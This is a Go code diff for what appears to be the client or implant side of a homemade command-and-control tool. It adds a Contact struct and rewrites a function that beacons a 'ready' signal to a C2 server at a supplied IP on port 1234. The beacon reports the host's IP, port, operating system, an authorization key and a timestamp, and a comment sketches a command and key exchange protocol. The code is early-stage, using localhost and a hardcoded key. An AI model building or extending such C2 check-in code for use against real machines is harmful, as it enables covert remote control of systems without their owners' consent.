@@ -7,7 +7,17 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"time"
 )
+
+// answer = (command)+(Key menager)+(Key client)+(answer)
+type Contact struct {
+	Ip     string
+	Port   string
+	System string //os
+	Key    string //new programm -> new individual key for autorizaiton (make with time and load main function) // ManagerKey string
+	Date   time.Time
+}
 
 func findLocalAddress(ips []net.IP) []string {
 	//192.168.0.?
@@ -76,16 +86,21 @@ func main() {
 func sendReadySignal(ip *string) {
 	c2_addr := "http://" + *ip + ":1234/ready"
 	local_ips := GetIPs()
-	local_IP := findLocalAddress(local_ips)[0]
-	local_IP = local_IP + ":5555"
+	fmt.Println(local_ips)
+	//local_IP := findLocalAddress(local_ips)[0] - After coming set
+	local_IP := "localhost"
 
 	fmt.Printf(local_IP)
 	fmt.Printf("\n")
 	body := strings.NewReader(fmt.Sprintf(`
 	{
-		"ip":"%s"
+		"Ip":"%s",
+		"Port":"%s",
+		"System":"%s",
+		"Key":"%s",
+		"Date":"%s"
 	}
-	`, local_IP))
+	`, local_IP, "5555", "Windows", "123456789", time.Now().String()))
 
 	resp, err := http.Post(c2_addr, "application/json", body)
 	if err != nil {
@@ -93,25 +108,6 @@ func sendReadySignal(ip *string) {
 	}
 	resp.Body.Close()
 	fmt.Printf("Status: " + resp.Status + "\n")
-	/*
-		var jsonData = []byte(`{
-			"ip":"localhost:5555"
-		}`)
-			request, error := http.NewRequest("POST", c2_addr, bytes.NewBuffer(jsonData))
-			request.Header.Set("Content-Type", "application/json; charset=UTF-8")
-
-			client := &http.Client{}
-			response, error := client.Do(request)
-			if error != nil {
-				panic(error)
-			}
-			defer response.Body.Close()
-
-			fmt.Println("response Status:", response.Status)
-			fmt.Println("response Headers:", response.Header)
-			body, _ := ioutil.ReadAll(response.Body)
-			fmt.Println("response Body:", string(body))
-	*/
 
 }
 
